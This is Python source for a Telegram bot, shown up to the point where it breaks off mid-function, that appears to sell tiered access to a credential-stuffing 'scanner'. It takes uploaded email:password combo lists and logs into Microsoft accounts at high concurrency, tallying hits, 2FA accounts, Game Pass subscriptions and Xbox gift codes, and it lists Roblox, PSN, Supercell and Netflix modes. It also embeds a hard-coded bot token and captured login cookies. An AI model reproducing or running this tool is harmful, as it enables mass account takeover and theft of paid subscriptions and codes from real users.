import sys
import telebot,requests,json,uuid,re,time,os,threading,queue,html,shutil,functools,random,sqlite3,signal,zipfile,io,urllib3
from telebot.types import InlineKeyboardMarkup,InlineKeyboardButton
from datetime import datetime,timedelta,timezone
from concurrent.futures import ThreadPoolExecutor,as_completed,wait,FIRST_COMPLETED
from urllib.parse import quote,unquote,urlparse,parse_qs
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from enum import Enum

if 'imghdr' not in sys.modules:
    class DummyImghdr:
        def what(self,*args,**kwargs):return 'jpeg'
    sys.modules['imghdr']=DummyImghdr()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
telebot.apihelper.RETRY_ON_ERROR=True
telebot.apihelper.MAX_RETRIES=5

BOT_TOKEN="8823388543:AAGjqIGjvnRS6esxr-GETvEchJAhVFT8Jok"
ADMIN_IDS=["8744777152"]
bot=telebot.TeleBot(BOT_TOKEN,parse_mode='HTML')
bot_start_time=time.time()
BOT_RUNNING=True
banned_users=[]
shutdown_flag=False
DEFAULT_THREADS_FREE=50
DEFAULT_THREADS_BASIC=75
DEFAULT_THREADS_VIP=125
CUSTOM_THREADS={"free":DEFAULT_THREADS_FREE,"basic":DEFAULT_THREADS_BASIC,"vip":DEFAULT_THREADS_VIP,"daily_reward_max":1000}
try:BOT_USERNAME=bot.get_me().username
except Exception:BOT_USERNAME="@XXRPOG_BOT"
SQLITE_DB='bot_database.db'
BACKUP_FILE='bot_backup.db'
DB_FILE='users_db'
FORCE_DB='force_subscriptions'
BANNED_DB='banned_users'
db_lock=threading.Lock()

class ScannerMode(Enum):
    XBOX="🎮 Xbox"
    ROBLOX="🎮 Roblox"
    PSN_V2="🎮 PSN V2"
    SUPERCELL="🎮 Supercell"
    NETFLIX="🟥 Netflix"
    SPEED="🚀 Speed Mode"
    XBOX_CODE_FETCHER="💎 Xbox code"
    ALL_IN_ONE="👑 ALL IN ONE"

class RateLimiter:
    def __init__(self,max_calls=40,period=1):
        self.max_calls,self.period,self.calls,self.lock=max_calls,period,[],threading.Lock()
    def wait_if_needed(self):
        with self.lock:
            now=time.time()
            self.calls=[t for t in self.calls if now-t<self.period]
            if len(self.calls)>=self.max_calls:
                sleep_time=self.period-(now-self.calls[0])
                if sleep_time>0:time.sleep(sleep_time)
            self.calls.append(time.time())
rate_limiter=RateLimiter(max_calls=35,period=1)

def send_with_retry(func,*args,max_retries=5,**kwargs):
    for attempt in range(max_retries):
        try:
            rate_limiter.wait_if_needed()
            return func(*args,**kwargs)
        except telebot.apihelper.ApiTelegramException as e:
            if "429" in str(e):
                time.sleep(2*(attempt+1)+random.uniform(0,1))
                continue
            elif "400" in str(e) or "403" in str(e) or "404" in str(e):return None
            raise
        except Exception:
            if attempt==max_retries-1:return None
            time.sleep(1)
    return None

def retry_on_error(func):
    @functools.wraps(func)
    def wrapper(*args,**kwargs):
        try:return send_with_retry(func,*args,**kwargs)
        except Exception:return None
    return wrapper

class MembershipStatus(Enum):
    FREE="🆓 FREE"
    BASIC="⭐ BASIC"
    VIP="👑 VIP"

def init_db(db_path=None):
    if db_path is None:
        db_path = SQLITE_DB
    try:
        conn=sqlite3.connect(db_path,check_same_thread=False,timeout=30)
        conn.execute("PRAGMA journal_mode=WAL;")
        conn.execute("PRAGMA synchronous=NORMAL;")
        conn.execute("PRAGMA temp_store=MEMORY;")
        conn.execute("PRAGMA cache_size=10000;")
        conn.execute("PRAGMA mmap_size=268435456;")
        conn.execute("PRAGMA foreign_keys=ON;")
        c=conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY,registered_date TEXT,total_scans INTEGER DEFAULT 0,total_hits INTEGER DEFAULT 0,today_scans INTEGER DEFAULT 0,last_scan_date TEXT,referrals INTEGER DEFAULT 0,referred_by TEXT,base_limit INTEGER DEFAULT 5000,username TEXT,first_name TEXT,membership TEXT,membership_expiry TEXT,multi_scan_count INTEGER DEFAULT 0,total_free_hits INTEGER DEFAULT 0,user_threads INTEGER DEFAULT 50,scanner_mode TEXT,xbox_hits INTEGER DEFAULT 0,roblox_hits INTEGER DEFAULT 0,supercell_hits INTEGER DEFAULT 0,netflix_hits INTEGER DEFAULT 0,psn_hits INTEGER DEFAULT 0,speed_hits INTEGER DEFAULT 0,total_files INTEGER DEFAULT 0,last_scan_time TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS force_subs (sub_data TEXT PRIMARY KEY)''')
        c.execute('''CREATE TABLE IF NOT EXISTS banned_users (user_id TEXT PRIMARY KEY)''')
        c.execute('''CREATE TABLE IF NOT EXISTS threads_config (key TEXT PRIMARY KEY,value INTEGER)''')
        c.execute('''CREATE TABLE IF NOT EXISTS rewards_data (user_id TEXT PRIMARY KEY,last_daily TEXT,claimed_codes TEXT,temp_lines INTEGER DEFAULT 0,temp_lines_expiry TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS gift_codes (code TEXT PRIMARY KEY,reward_type TEXT,reward_value TEXT,max_uses INTEGER DEFAULT 1,current_uses INTEGER DEFAULT 0)''')
        c.execute('''CREATE TABLE IF NOT EXISTS disabled_modes (mode TEXT PRIMARY KEY)''')
        try:c.execute("ALTER TABLE rewards_data ADD COLUMN temp_lines INTEGER DEFAULT 0")
        except Exception:pass
        try:c.execute("ALTER TABLE rewards_data ADD COLUMN temp_lines_expiry TEXT")
        except Exception:pass
        for col,typ in [("xbox_hits","INTEGER DEFAULT 0"),("roblox_hits","INTEGER DEFAULT 0"),("supercell_hits","INTEGER DEFAULT 0"),("netflix_hits","INTEGER DEFAULT 0"),("psn_hits","INTEGER DEFAULT 0"),("speed_hits","INTEGER DEFAULT 0"),("total_files","INTEGER DEFAULT 0"),("last_scan_time","TEXT")]:
            try:c.execute(f"ALTER TABLE users ADD COLUMN {col} {typ}")
            except Exception:pass
        conn.commit()
        conn.close()
        return True
    except Exception:
        return False

def init_db_with_fallback():
    if not init_db(SQLITE_DB):
        if os.path.exists(BACKUP_FILE):
            try:
                import shutil as _shutil
                _shutil.copyfile(BACKUP_FILE, SQLITE_DB)
                init_db(SQLITE_DB)
            except Exception:
                init_db(SQLITE_DB)
        else:
            init_db(SQLITE_DB)

def save_db_users(data):
    with db_lock:
        try:
            conn=sqlite3.connect(SQLITE_DB,check_same_thread=False,timeout=30);conn.execute("PRAGMA journal_mode=WAL;");conn.execute("PRAGMA synchronous=NORMAL;");c=conn.cursor()
            c.execute("BEGIN TRANSACTION")
            for user_id,udata in data.items():
                c.execute('''INSERT OR REPLACE INTO users (user_id,registered_date,total_scans,total_hits,today_scans,last_scan_date,referrals,referred_by,base_limit,username,first_name,membership,membership_expiry,multi_scan_count,total_free_hits,user_threads,scanner_mode,xbox_hits,roblox_hits,supercell_hits,netflix_hits,psn_hits,speed_hits,total_files,last_scan_time) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)''',(user_id,udata.get('registered_date'),udata.get('total_scans',0),udata.get('total_hits',0),udata.get('today_scans',0),udata.get('last_scan_date'),udata.get('referrals',0),udata.get('referred_by'),udata.get('base_limit',5000),udata.get('username'),udata.get('first_name'),udata.get('membership'),udata.get('membership_expiry'),udata.get('multi_scan_count',0),udata.get('total_free_hits',0),udata.get('user_threads',25),udata.get('scanner_mode',ScannerMode.XBOX.value),udata.get('xbox_hits',0),udata.get('roblox_hits',0),udata.get('supercell_hits',0),udata.get('netflix_hits',0),udata.get('psn_hits',0),udata.get('speed_hits',0),udata.get('total_files',0),udata.get('last_scan_time')))
            conn.commit();conn.close()
        except Exception:pass

def save_db_rewards():
    with db_lock:
        try:
            conn=sqlite3.connect(SQLITE_DB,check_same_thread=False,timeout=30);conn.execute("PRAGMA journal_mode=WAL;");conn.execute("PRAGMA synchronous=NORMAL;");c=conn.cursor();c.execute("BEGIN TRANSACTION")
            for u, rd in rewards_db.items():
                c.execute("INSERT OR REPLACE INTO rewards_data (user_id, last_daily, claimed_codes, temp_lines, temp_lines_expiry) VALUES (?,?,?,?,?)", (u, rd.get("last_daily"), json.dumps(rd.get("claimed_codes", [])), rd.get("temp_lines", 0), rd.get("temp_lines_expiry")))
            conn.commit();conn.close()
        except Exception:pass

def save_db_gift_codes():
    with db_lock:
        try:
            conn=sqlite3.connect(SQLITE_DB,check_same_thread=False,timeout=30);conn.execute("PRAGMA journal_mode=WAL;");conn.execute("PRAGMA synchronous=NORMAL;");c=conn.cursor();c.execute("DELETE FROM gift_codes")
            for code, cd in gift_codes_db.items():
                c.execute("INSERT INTO gift_codes (code, reward_type, reward_value, max_uses, current_uses) VALUES (?,?,?,?,?)", (code, cd['type'], cd['value'], cd['max'], cd['curr']))
            conn.commit();conn.close()
        except Exception:pass

def save_db_force_subs(data):
    with db_lock:
        try:
            conn=sqlite3.connect(SQLITE_DB,check_same_thread=False,timeout=30);conn.execute("PRAGMA journal_mode=WAL;");conn.execute("PRAGMA synchronous=NORMAL;");c=conn.cursor();c.execute("DELETE FROM force_subs")
            for sub in data:c.execute("INSERT INTO force_subs (sub_data) VALUES (?)",(sub,))
            conn.commit();conn.close()
        except Exception:pass

def save_db_banned_users(data):
    with db_lock:
        try:
            conn=sqlite3.connect(SQLITE_DB,check_same_thread=False,timeout=30);conn.execute("PRAGMA journal_mode=WAL;");conn.execute("PRAGMA synchronous=NORMAL;");c=conn.cursor();c.execute("DELETE FROM banned_users")
            for user_id in data:c.execute("INSERT INTO banned_users (user_id) VALUES (?)",(user_id,))
            conn.commit();conn.close()
        except Exception:pass

def save_threads_config():
    with db_lock:
        try:
            conn=sqlite3.connect(SQLITE_DB,check_same_thread=False,timeout=30);conn.execute("PRAGMA journal_mode=WAL;");conn.execute("PRAGMA synchronous=NORMAL;");c=conn.cursor();c.execute("DELETE FROM threads_config")
            for k,v in CUSTOM_THREADS.items():c.execute("INSERT INTO threads_config (key,value) VALUES (?,?)",(k,v))
            conn.commit();conn.close()
        except Exception:pass

def save_disabled_modes():
    with db_lock:
        try:
            conn=sqlite3.connect(SQLITE_DB,check_same_thread=False,timeout=30);conn.execute("PRAGMA journal_mode=WAL;");conn.execute("PRAGMA synchronous=NORMAL;");c=conn.cursor()
            c.execute("DELETE FROM disabled_modes")
            for m in disabled_modes:c.execute("INSERT INTO disabled_modes (mode) VALUES (?)",(m,))
            conn.commit();conn.close()
        except Exception:pass

def save_db(data,db_file):
    if db_file==DB_FILE:save_db_users(data)
    elif db_file==FORCE_DB:save_db_force_subs(data)
    elif db_file==BANNED_DB:save_db_banned_users(data)

def migrate_json_to_sqlite():
    init_db()
    if not os.path.exists('users_db.json') and not os.path.exists('force_subscriptions.json'):return
    if os.path.exists('users_db.json'):
        try:
            with open('users_db.json','r',encoding='utf-8') as f:save_db_users(json.load(f))
            os.rename('users_db.json','users_db.json.bak')
        except Exception:pass
    if os.path.exists('force_subscriptions.json'):
        try:
            with open('force_subscriptions.json','r',encoding='utf-8') as f:
                data=json.load(f)
                save_db_force_subs(list(data.keys()) if isinstance(data,dict) else data)
            os.rename('force_subscriptions.json','force_subscriptions.json.bak')
        except Exception:pass
    if os.path.exists('banned_users.json'):
        try:
            with open('banned_users.json','r',encoding='utf-8') as f:save_db_banned_users(json.load(f))
            os.rename('banned_users.json','banned_users.json.bak')
        except Exception:pass
    if os.path.exists('threads_config.json'):
        try:
            with open('threads_config.json','r',encoding='utf-8') as f:
                CUSTOM_THREADS.update(json.load(f));save_threads_config()
            os.rename('threads_config.json','threads_config.json.bak')
        except Exception:pass

def load_db_sqlite():
    try:
        conn=sqlite3.connect(SQLITE_DB,check_same_thread=False,timeout=30);conn.execute("PRAGMA journal_mode=WAL;");conn.execute("PRAGMA synchronous=NORMAL;");conn.row_factory=sqlite3.Row;c=conn.cursor()
        c.execute("SELECT * FROM users");db_dict={}
        for row in c.fetchall():
            db_dict[row['user_id']]={"registered_date":row['registered_date'],"total_scans":row['total_scans'],"total_hits":row['total_hits'],"today_scans":row['today_scans'],"last_scan_date":row['last_scan_date'],"referrals":row['referrals'],"referred_by":row['referred_by'],"base_limit":row['base_limit'],"username":row['username'],"first_name":row['first_name'],"membership":row['membership'],"membership_expiry":row['membership_expiry'],"multi_scan_count":row['multi_scan_count'],"total_free_hits":row['total_free_hits'],"user_threads":row['user_threads'] if row['user_threads'] is not None else 50,"scanner_mode":row['scanner_mode'] if row['scanner_mode'] is not None else ScannerMode.XBOX.value,"xbox_hits":row['xbox_hits'] if row['xbox_hits'] is not None else 0,"roblox_hits":row['roblox_hits'] if row['roblox_hits'] is not None else 0,"supercell_hits":row['supercell_hits'] if row['supercell_hits'] is not None else 0,"netflix_hits":row['netflix_hits'] if row['netflix_hits'] is not None else 0,"psn_hits":row['psn_hits'] if row['psn_hits'] is not None else 0,"speed_hits":row['speed_hits'] if row['speed_hits'] is not None else 0,"total_files":row['total_files'] if row['total_files'] is not None else 0,"last_scan_time":row['last_scan_time'] if row['last_scan_time'] is not None else None}
        c.execute("SELECT sub_data FROM force_subs");force_subs_list=[row['sub_data'] for row in c.fetchall()]
        c.execute("SELECT user_id FROM banned_users");banned_users_list=[row['user_id'] for row in c.fetchall()]
        c.execute("SELECT key,value FROM threads_config");threads_config_dict={row['key']:row['value'] for row in c.fetchall()}

        c.execute("SELECT * FROM rewards_data");r_dict={}
        for row in c.fetchall():
            temp_l=0;temp_e=None
            try:temp_l=row['temp_lines'] if row['temp_lines'] is not None else 0
            except Exception:pass
            try:temp_e=row['temp_lines_expiry']
            except Exception:pass
            r_dict[row['user_id']]={"last_daily":row['last_daily'],"claimed_codes":json.loads(row['claimed_codes']) if row['claimed_codes'] else [],"temp_lines":temp_l,"temp_lines_expiry":temp_e}

        c.execute("SELECT * FROM gift_codes");g_dict={}
        for row in c.fetchall():g_dict[row['code']]={"type":row['reward_type'],"value":row['reward_value'],"max":row['max_uses'],"curr":row['current_uses']}

        try:
            c.execute("SELECT mode FROM disabled_modes");d_modes=[row['mode'] for row in c.fetchall()]
        except Exception:d_modes=[]

        conn.close();return db_dict,force_subs_list,banned_users_list,threads_config_dict,r_dict,g_dict,d_modes
    except Exception:return {},[],[],{},{},{},[]

migrate_json_to_sqlite()
init_db_with_fallback()
db,force_subs,banned_users,loaded_threads_config,rewards_db,gift_codes_db,disabled_modes=load_db_sqlite()
CUSTOM_THREADS.update(loaded_threads_config)

def get_today_utc():return datetime.now(timezone.utc).strftime("%Y-%m-%d")

def get_user(user_id):
    user_id,today=str(user_id),get_today_utc()
    if user_id not in db:
        db[user_id]={"registered_date":today,"total_scans":0,"total_hits":0,"today_scans":0,"last_scan_date":today,"referrals":0,"referred_by":None,"base_limit":5000,"username":None,"first_name":None,"membership":MembershipStatus.FREE.value,"membership_expiry":None,"multi_scan_count":0,"total_free_hits":0,"user_threads":50,"scanner_mode":ScannerMode.XBOX.value,"xbox_hits":0,"roblox_hits":0,"supercell_hits":0,"netflix_hits":0,"psn_hits":0,"speed_hits":0,"total_files":0,"last_scan_time":None}
        save_db(db,DB_FILE);return db[user_id],True
    if db[user_id]["last_scan_date"]!=today:db[user_id]["today_scans"],db[user_id]["last_scan_date"]=0,today;save_db(db,DB_FILE)
    if db[user_id].get("membership_expiry"):
        try:
            if datetime.now(timezone.utc)>datetime.fromisoformat(db[user_id]["membership_expiry"]):
                db[user_id]["membership"],db[user_id]["membership_expiry"]=MembershipStatus.FREE.value,None
                max_free=CUSTOM_THREADS.get("free",50)
                if db[user_id].get("user_threads",50)>max_free:db[user_id]["user_threads"]=max_free
                if db[user_id].get("scanner_mode")==ScannerMode.ALL_IN_ONE.value:db[user_id]["scanner_mode"]=ScannerMode.XBOX.value
                save_db(db,DB_FILE)
        except Exception:pass
    return db[user_id],False

def update_user_info(user_id,from_user):
    try:
        user_id=str(user_id)
        username=from_user.username if from_user.username else "No username"
        first_name=from_user.first_name if from_user.first_name else "Unknown"
        if user_id in db:
            updated=False
            if db[user_id].get("username")!=username:db[user_id]["username"]=username;updated=True
            if db[user_id].get("first_name")!=first_name:db[user_id]["first_name"]=first_name;updated=True
            if updated:save_db(db,DB_FILE)
    except Exception:pass

def get_user_daily_limit(user_id):
    try:
        user_data,_=get_user(user_id);membership=user_data.get("membership")
        if str(user_id)=="8744777152":return float('inf')
        if membership==MembershipStatus.BASIC.value:return 25000
        elif membership==MembershipStatus.VIP.value:return float('inf')
        else:
            base_limit = user_data.get("base_limit", 5000)
            uid = str(user_id)
            rd = rewards_db.get(uid, {})
            temp_lines = rd.get("temp_lines", 0)
            exp = rd.get("temp_lines_expiry")
            if temp_lines > 0 and exp:
                try:
                    if datetime.now(timezone.utc) > datetime.fromisoformat(exp):
                        rd["temp_lines"] = 0
                        rd["temp_lines_expiry"] = None
                        temp_lines = 0
                        save_db_rewards()
                except Exception:pass
            return base_limit + temp_lines
    except Exception:return 5000

def get_file_max_lines(user_id):
    try:
        user_data,_=get_user(user_id);membership=user_data.get("membership")
        if str(user_id)=="8744777152":return float('inf')
        if membership==MembershipStatus.BASIC.value:return 12500
        elif membership==MembershipStatus.VIP.value:return 25000
        else:return 2500
    except Exception:return 2500

def get_max_threads_for_user(user_data):
    try:
        membership=user_data.get("membership")
        if str(user_data.get("user_id"))=="8744777152":return 300
        if membership==MembershipStatus.BASIC.value:return CUSTOM_THREADS.get("basic",75)
        elif membership==MembershipStatus.VIP.value:return CUSTOM_THREADS.get("vip",125)
        else:return CUSTOM_THREADS.get("free",50)
    except Exception:return 50

def get_user_thread_count(user_data):
    try:
        user_threads,max_allowed=user_data.get("user_threads",50),get_max_threads_for_user(user_data)
        if user_threads>max_allowed:user_threads=max_allowed;user_data["user_threads"]=user_threads;save_db(db,DB_FILE)
        return user_threads
    except Exception:return 50

TARGET_SUBSCRIPTIONS=['Xbox Game Pass Ultimate','Xbox Game Pass Core','Xbox Game Pass Console','PC Game Pass','Game Pass Premium','Game Pass Essential','Game Pass','EA Play Pro','EA Play','Ubisoft+ Classics','Ubisoft+ Premium','Xbox Live Gold','Xbox Cloud Gaming']

class Job:
    def __init__(self,chat_id,file_name,combos,priority=False):
        self.job_id,self.chat_id,self.file_name,self.combos,self.total=str(uuid.uuid4()),str(chat_id),html.escape(file_name),combos,len(combos)
        self.checked=self.hits=self.free=self.bad=self.twofa=self.error=self.cpm=0
        self.email_changed = 0
        self.valid = 0
        self.start_time,self.status,self.pause_event,self.stop_flag=None,'Queued',threading.Event(),False
        self.pause_event.set()
        self.hits_data,self.free_data,self.email_changed_data,self.valid_data=[],[],[],[]
        self.twofa_data,self.bad_data=[],[]
        self.msg_id,self.processed_lines,self.priority=None,0,priority
        self.pause_start_time,self.auto_resume_timer,self.scanner_mode=None,None,ScannerMode.XBOX.value
        self.roblox_hits=self.supercell_hits=self.xbox_hits=self.psn_hits=0
        self.netflix_hits=0
        self.valid_hot=0
        self.hotmail_hits=0
        self.roblox_data,self.supercell_data,self.xbox_data,self.psn_data=[],[],[],[]
        self.netflix_data,self.valid_hot_data=[],[]
        self.hotmail_data=[]

        self.codes_pulled = 0
        self.invalid = 0
        self.region_locked_count = 0
        self.redeemed = 0
        self.expired = 0
        self.rate_limited = 0
        self.valid_codes_list = []
        self.region_locked_list = []

job_queue,current_jobs,jobs_lock=queue.Queue(),[],threading.Lock()

def is_user_busy(chat_id,user_data):
    try:
        chat_id,membership=str(chat_id),user_data.get("membership")
        with jobs_lock:
            total_user_jobs=sum(1 for job in current_jobs if job.chat_id==chat_id and job.status in ['Running','Paused'])+sum(1 for job in list(job_queue.queue) if job.chat_id==chat_id)
            if str(chat_id)=="8744777152":return total_user_jobs>=5
            elif membership in [MembershipStatus.VIP.value,MembershipStatus.BASIC.value]:return total_user_jobs>=3
            else:return total_user_jobs>=1
    except Exception:return True

def get_active_jobs_count_free_only():
    count=0
    try:
        with jobs_lock:
            for job in current_jobs:
                if job.status in ['Running','Paused']:
                    user_data,_=get_user(job.chat_id)
                    if user_data.get("membership")==MembershipStatus.FREE.value and str(job.chat_id)!="8744777152":count+=1
    except Exception:pass
    return count

def get_currently_scanning_users():
    try:
        with jobs_lock:return sum(1 for job in current_jobs if job.status in ['Running','Paused'])
    except Exception:return 0

def trunc_name(fname):
    if len(fname) > 15:
        return fname[:15] + "...."
    return fname

def create_optimized_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "OPTIONS", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
    return session

def get_ms_tokens(session):
    try:
        res = session.get("https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en", timeout=15)
        text = res.text
        ppft_pat  = r'name=["\']PPFT["\'][^>]*value=["\']([^"\']+)["\']'
        ppft_pat2 = r'value=["\']([^"\']+)["\'][^>]*name=["\']PPFT["\']'
        sft = (re.search(ppft_pat, text) or re.search(ppft_pat2, text)
               or re.search(r'sFTTag[^"]*?value=\\\"([^\\\"]+)\\\"', text)
               or re.search(r'value=\\\"(.+?)\\\"', text))
        post = re.search(r'"urlPost":"(.+?)"', text) or re.search(r"urlPost:'(.+?)'", text)
        if sft and post:
            return post.group(1), sft.group(1)
        return None, None
    except:
        return None, None

def extract_xbox_codes(text):
    code_pattern = r'[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}'
    return [m.upper() for m in re.findall(code_pattern, str(text))]

_MSG_KEYS = {"text", "messageText", "content", "body", "message"}

def find_all_messages(obj):
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in _MSG_KEYS and isinstance(v, str):
                yield v
            else:
                yield from find_all_messages(v)
    elif isinstance(obj, list):
        for item in obj:
            yield from find_all_messages(item)

class XboxCodeChecker:
    @staticmethod
    def generate_reference_id():
        timestamp_val = int(time.time() // 30)
        n = f'{timestamp_val:08X}'
        o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
        result_chars = []
        for e in range(64):
            if e % 8 == 1:
                result_chars.append(n[(e - 1) // 8])
            else:
                result_chars.append(o[e])
        return "".join(result_chars)

    @staticmethod
    def login_microsoft_account(email, password):
        session = requests.Session()
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        session.headers = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://account.microsoft.com/',
            'Origin': 'https://account.microsoft.com',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
        }
        try:
            login_response = session.post(
                f"https://login.live.com/ppsecure/post.srf?username={email}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=1761964181&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none",
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$"},
                headers = {'Content-Type': 'application/x-www-form-urlencoded', "Cookie": "MSPRequ=id=N&lt=1761964181&co=1; uaid=f8aac2614ca54994b0bb9621af361fe6; MSCC=110.226.176.161-IN; MSPOK=$uuid-28da118b-591b-4245-a835-d6a7a6516fc6; OParams=11O.DtU8h4PuH7vnv3smo7N1*styCuvoTV2MRZi8wj4oQDgi!Mpw6KZwEGt9RgLvxFZ*vwFA!0!1OLGPdeGOwX9EAmOhMaLVWgPa3!lut3b6iSqLZwZ6wKNo48s9Glp9oJNYOJ!QdDvn9Zlz6yUfmGNA71N*7RJJ82DhAEUtv9cj3S5VSLPp*rLjsZw*T!eA4rT1OoHQfj!E0MpIMb7XTGunq0W296qtBwcXcMiKnoG1DOOam7ArRr9kSeVqb2OO3gQ8tBcGfef*aveFCKUAbkdjWuhRB4vYl2RmUA5yc967445z!g761lZOAEaXxAMTGxbEibxTneHDX4PpnqWIwURKn*igMH7p7LRvIUh0TPAO2ff6h793xvhtYi3SYKj4gT6KaajxfJ3fL0Ceb*308Ner9hi32b2GVnW81LmKcQLF343cM0KcKgRXBqkPdIJ3fS*4l8wFshd1kpI0elXVUgQ9A5a4tPKO46vh9k*luyC!RSNjzNs4oQKLFF1TXRB1LifVMLwKQ3aJTxxys!YvalzEB5q6TG*bKZ1FDBjFfpSIEVdfg8XMOBszi3TGeXJw*sg5zsSVv9Efpe3UfEvAgAr24Qk*fYd2G0FdzrNpxb9nntPSX*TYsh2k5EYuW9RD6qo!qtSh8EXzTq0WS6qII0*Tkn*NxydUx3WPbZ2fiOU*ulkS8TlhUKRRbNNTMeYIWl93GOeP9cIuXtFuZ3XZimHUgv86pjFVxKXeDCVQpyOjVUSL67AuADB0ukQBYlw7z48cv0Q5XlXX4umkZErVDo5f9W4uE1mTaav!WpKqighrUL2Me5Uqexr*RCtwpDu1f5W1ay0xmPoxx*W5lIIQUmKYua93KiFQsxnma3iHtSaH2tUeClZaWauWKkBt5xwyZ3ajhyWT4Ylw8lfDgf0RNWQhdrQ6EVtXowflqyiWC71dfjUDqVnSCzTcUuZCX*Hzkewo5G3LZczEm1MeuQRPMFisXNkf3KSBgzwqlyt8rHQrNYzuZRMTyO9WGt1RS1kTDs1XNu3PG8qA1HWTq7kwHvKeVblEr!!YGoUFWaWWsQqLa0Co7x83jzWgGDTOa3NFawXQGsA5snh7HsS01WqUHgCtHT9RKRegHay9aO813K5jayLc3UR9qO2mspBZhSKuaYPOoaNUeoF5ImgWitT*g1ogFFJl12AgfmtEVWDVhzmvtR1j7oNlvEE2g0fu0SMo!NTV3zbWjxfN!F1b6UxCV0uFT7QTf8yL2M4Lw8CnCTWa5N*jc2SSZe4O2SU*2HPHn0lYFOUkGGoXTe2pHGQiW0hA8jFnufIOzjTZ0VLEA7Z6QlW62lkpDEW9OXmUdqRmp225Ag$$"},
                allow_redirects=True, timeout=30
            )
            login_request = login_response.text.replace('\\', '')
            reurl_match = re.search(r'replace\(\"([^\"]+)\"', login_request)
            if not reurl_match: return None
            reurl = reurl_match.group(1)
            try: reresp = session.get(reurl, timeout=30).text
            except Exception: return None
            actch = re.search(r'<form.*?action="(.*?)".*?>', reresp)
            if not actch: return None
            acu = actch.group(1)
            input_matches = re.findall(r'<input.*?name="(.*?)".*?value="(.*?)".*?>', reresp)
            fta = {name: value for name, value in input_matches}
            try:
                final_response = session.post(acu, data=fta, allow_redirects=True, timeout=30)
                if final_response.status_code != 200: return None
            except Exception: return None
            return session
        except Exception: return None

    @staticmethod
    def get_auth_token(session, force_refresh=False):
        try:
            if not force_refresh and hasattr(session, 'wlid_token'): return session.wlid_token
            session.get("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", timeout=15)
            token_headers = {'Accept': 'application/json', 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest', 'Cache-Control': 'no-cache', 'Pragma': 'no-cache', 'Referer': 'https://account.microsoft.com/billing/redeem'}
            token_response = session.get('https://account.microsoft.com/auth/acquire-onbehalf-of-token', params={'scopes': 'MSComServiceMBISSL'}, headers=token_headers, timeout=15)
            if token_response.status_code != 200: return None
            token_data = token_response.json()
            if not token_data or len(token_data) == 0: return None
            token = token_data[0]['token']
            session.wlid_token = token
            return token
        except Exception: return None

    @staticmethod
    def get_store_cart_state(session, force_refresh=False):
        try:
            if force_refresh and hasattr(session, 'store_state'): delattr(session, 'store_state')
            if not force_refresh and hasattr(session, 'store_state'): return session.store_state
            token = XboxCodeChecker.get_auth_token(session, force_refresh)
            if not token: return None
            ms_cv = f"{uuid.uuid4()}"
            url = 'https://www.microsoft.com/store/purchase/buynowui/redeemnow'
            params = {'ms-cv': ms_cv, 'market': 'US', 'locale': 'en-GB', 'clientName': 'AccountMicrosoftCom'}
            payload = {'data': '{"usePurchaseSdk":true}', 'market': 'US', 'cV': ms_cv, 'locale': 'en-GB', 'msaTicket': token, 'pageFormat': 'full', 'urlRef': 'https://account.microsoft.com/billing/redeem', 'isRedeem': 'true', 'clientType': 'AccountMicrosoftCom', 'layout': 'Inline', 'cssOverride': 'AMC', 'scenario': 'redeem', 'timeToInvokeIframe': '4977', 'sdkVersion': 'VERSION_PLACEHOLDER'}
            response = session.post(url, params=params, data=payload, timeout=30, allow_redirects=True)
            text = response.text
            match = re.search(r'window\.__STORE_CART_STATE__=({.*?});', text, re.DOTALL)
            if not match: return None
            store_state = json.loads(match.group(1))
            extracted_values = {
                'ms_cv': store_state.get('appContext', {}).get('cv', ''),
                'correlation_id': store_state.get('appContext', {}).get('correlationId', ''),
                'tracking_id': store_state.get('appContext', {}).get('trackingId', ''),
                'vector_id': store_state.get('appContext', {}).get('vectorId', ''),
